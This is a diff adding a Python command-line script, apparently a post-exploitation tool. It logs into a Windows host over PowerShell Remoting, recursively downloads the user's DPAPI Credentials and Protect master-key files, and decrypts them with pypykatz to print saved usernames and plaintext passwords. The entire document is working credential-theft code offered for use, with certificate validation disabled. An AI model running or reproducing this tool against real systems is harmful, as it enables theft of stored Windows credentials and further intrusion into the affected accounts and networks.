@@ -1,0 +1,134 @@
+#!/usr/bin/env -S uv run --script
+# /// script
+# requires-python = ">=3.10"
+# dependencies = [
+#     "pypykatz",
+#     "pypsrp",
+#     "typer",
+#     "rich",
+# ]
+# ///
+
+from pathlib import PureWindowsPath, Path
+
+import pypsrp.client
+import typer
+
+from pypykatz.dpapi.dpapi import DPAPI
+from requests.exceptions import HTTPError
+from rich.traceback import install
+
+from rich.console import Console
+from rich.text import Text
+
+console = Console()
+install(show_locals=True)
+
+def show(status: int, message: str):
+    if status < 0:
+        mp = "[-]"
+    elif status == 0:
+        mp = "[+]"
+    else:
+        mp = "[!]"
+
+    text = Text(f"{mp} {message}")
+
+    if status < 0:
+        text.stylize("bold magenta")
+    elif status == 0:
+        text.stylize("bold green")
+    else:
+        text.stylize("bold yellow")
+
+    console.print(text)        
+
+def get_files(client, directory):
+    output, streams, had_errors = client.execute_ps(f'Get-ChildItem -Path "{directory}" -Recurse -Force | Select-Object -ExpandProperty FullName')
+    files = []
+
+    for line in output.split("\n"):
+        try:
+            filename = PureWindowsPath(line).name.strip()
+
+            if not filename:
+                continue
+
+            show(0, f"Fetching {line}")
+
+            if Path(filename).exists():
+                show(1, f"Already downloaded {line} - skipping")
+                files.append(filename)
+                continue
+
+            client.fetch(line, filename)
+            files.append(filename)
+        except Exception:
+            pass
+    
+    return files
+
+def get_user_sid(client):
+    output, streams, had_errors = client.execute_ps('(Get-LocalUser $env:USERNAME).SID.Value')
+    return output.split("\n")[0]
+    
+def main(
+    host: str = typer.Option(default=...),
+    domain: str = typer.Option(default=...),
+    username: str = typer.Option(default=...),
+    password: str = typer.Option(default=...),
+):
+    try:
+        show(0, f"Attempting connection to {host}")
+        with pypsrp.client.Client(
+            host,
+            cert_validation=False,
+            ssl=False,
+            username=f"{username}@{domain}",
+            password=password
+        ) as client:
+            usersid = get_user_sid(client)
+            show(0, f"usersid: {usersid}")
+            credential = []
+            protect = []
+
+            for directory in ["Local", "Roaming"]:
+                for file in get_files(client, f"C:\\Users\\{username}\\AppData\\{directory}\\Microsoft\\Credentials\\"):
+                    credential.append(file)
+
+                for file in get_files(client, f"C:\\Users\\{username}\\AppData\\{directory}\\Microsoft\\Protect\\{usersid}\\"):
+                    protect.append(file)
+
+            print("\n", "-"*100)
+            show(0, f"Collected Credentials:\n\t{'\n\t'.join(credential)}\n")
+            show(0, f"Collected Protect:\n\t{'\n\t'.join(protect)}\n")
+            print("-"*100, "\n")
+
+            dpapi = DPAPI()
+
+            dpapi.get_prekeys_from_password(usersid, password = password) # TODO: hash? meh...
+
+            for f in protect:
+                if f == "Preferred":
+                    continue
+                
+                dpapi.decrypt_masterkey_file(f)
+
+            print("\n", "-"*100)
+            for f in credential:
+                credential_file = dpapi.decrypt_credential_file(f)
+                show(0, f)
+                print(f"""
+        Type: {credential_file.type_pretty.name}
+        Target: {credential_file.target}
+        Alias: {credential_file.target_alias.decode()}
+        Username: {credential_file.username}
+        Password: {credential_file.unknown4.decode()}
+        """)
+            print("-"*100, "\n")
+    except HTTPError as e:
+        show(-1, f"{e}")
+
+
+if __name__ == "__main__":
+    typer.run(main)
